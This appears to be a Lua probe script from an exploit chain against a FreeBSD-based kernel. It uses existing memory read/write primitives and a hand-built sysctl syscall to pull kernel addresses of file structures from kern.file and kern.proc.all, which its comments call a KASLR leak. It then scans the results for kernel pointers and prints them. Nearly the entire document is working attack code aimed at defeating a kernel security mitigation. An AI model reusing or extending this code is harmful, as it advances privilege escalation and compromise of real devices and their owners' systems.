-- CRASH_CLASS: LOW
-- PROBE 1063a: sysctl kern.file {1,15} and kern.proc.all {1,14,0,0} with exact return codes
--
-- Context: kern.file returns an array of struct xfile, whose first qwords are the kernel
-- addresses of struct file (xf_file) and f_file->f_data (xf_data). That is the classic FreeBSD
-- KASLR leak. Our corpus records it as "blocked" from probe 42h2 (an old phase-7 probe that
-- routed through the Lua resolver, which filters sysctl) and from a size==0 read that cannot
-- distinguish "handler refused" from "size call failed". This probe measures both OIDs directly
-- through make_syscall(202): the size call (oldp=NULL), then the fetch, printing the raw return.

print("=== PROBE 1063a: kern.file / kern.proc.all direct ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function as_addr(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(uint64(a)) end)
    if ok and v then return to_num(v) end
    return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(uint64(a)) end)
    if ok and v then return to_num(v) end
    return nil
end
local function wd(a, v) pcall(function() memory.write_dword(uint64(a), uint64(v)) end) end
local function wq(a, v) pcall(function() memory.write_qword(uint64(a), uint64(v)) end) end
local function is_kaddr(v)
    local hi = math.floor(v / 4294967296)
    return hi >= 0xFFFF8000 and hi < 0xFFFFFFF0
end

local function mk(n)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local sc = mk(202)

local mib = memory.alloc(0x20)
local lenp = memory.alloc(8)
local probe_buf = memory.alloc(0x40)

-- (1) size query: oldp = NULL, namelen = 2, mib = {1,15}
local function size_query(name_len, l0, l1, l2, l3)
    wd(mib, l0); wd(mib + 4, l1); wd(mib + 8, l2); wd(mib + 12, l3)
    wq(lenp, 0)
    local ok, rv = pcall(function()
        return sc(uint64(as_addr(mib)), uint64(name_len), uint64(0), uint64(as_addr(lenp)), uint64(0), uint64(0))
    end)
    return ok and to_num(rv) or -999, rq(lenp)
end

local r, n = size_query(2, 1, 15, 0, 0)
print(string.format("[A] kern.file size-call rv=%d size=%s", r, tostring(n)))

r, n = size_query(4, 1, 14, 0, 0)
print(string.format("[B] kern.proc.all size-call rv=%d size=%s", r, tostring(n)))

r, n = size_query(4, 1, 14, 1, 0)
print(string.format("[C] kern.proc.pid(0) size-call rv=%d size=%s", r, tostring(n)))

-- (2) fetch with the size just reported (clamped), if it was plausible
local function fetch(label, name_len, l0, l1, l2, l3, size)
    local want = size
    if want == nil or want < 0 or want > 0x100000 then want = 0x4000 end
    if want == 0 then want = 0x40 end
    local buf = memory.alloc(want + 0x40)
    if as_addr(buf) == 0 then print(label .. " alloc failed"); return end
    local i = 0
    while i < want do wq(as_addr(buf) + i, 0xDEADBEEFDEADBEEF); i = i + 8 end
    wd(mib, l0); wd(mib + 4, l1); wd(mib + 8, l2); wd(mib + 12, l3)
    wq(lenp, want)
    local ok, rv = pcall(function()
        return sc(uint64(as_addr(mib)), uint64(name_len), uint64(as_addr(buf)), uint64(as_addr(lenp)), uint64(0), uint64(0))
    end)
    local rr = ok and to_num(rv) or -999
    local got = rq(lenp)
    local kp, first = 0, nil
    local j = 0
    while j < want do
        local v = rq(as_addr(buf) + j)
        if v and is_kaddr(v) then
            kp = kp + 1
            if first == nil then first = j end
        end
        j = j + 8
    end
    print(string.format("%s fetch rv=%d len=%s kaddr=%d first_at=%s", label, rr, tostring(got), kp, tostring(first)))
    if kp > 0 then
        local k = 0
        while k < 0x40 do
            local v = rq(as_addr(buf) + k)
            print(string.format("   +%02X %s", k, v and string.format("%X", v) or "nil"))
            k = k + 8
        end
    end
end

local _, sf = size_query(2, 1, 15, 0, 0)
fetch("[D] kern.file", 2, 1, 15, 0, 0, sf)
local _, sp = size_query(4, 1, 14, 0, 0)
fetch("[E] kern.proc.all", 4, 1, 14, 0, 0, sp)

local getpid_ok, pv = pcall(mk(20))
print(string.format("[Z] alive pid=%d", getpid_ok and to_num(pv) or -1))
print("=== COMPLETE ===")
